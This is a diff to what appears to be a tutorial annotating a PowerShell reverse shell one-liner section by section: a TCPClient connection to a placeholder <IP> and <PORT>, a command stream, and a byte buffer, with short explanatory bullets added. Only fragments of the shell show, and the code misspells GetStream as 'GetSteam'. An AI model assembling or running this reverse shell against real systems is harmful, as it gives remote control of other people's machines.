@@ -32,6 +32,7 @@ powershell -nop -c
 ```powershell
 "$client = New-Object System.Net.Sockets.TCPClient(<IP>, <PORT>);
 ```
+- Sets TCP socket to `<IP> <PORT>`
 
 ### Setting the Command Stream
 ```powershell
@@ -39,8 +40,9 @@ $stream = $client.GetSteam();
 ```
 ### Empty Byte Stream
 ```powershell
-[byte[]]$bytes = 0..65535|
+[byte[]]$bytes = 0..65535|%{0};
 ```
+- Create a 
 
 ### Calling Powershell
 ```powershell
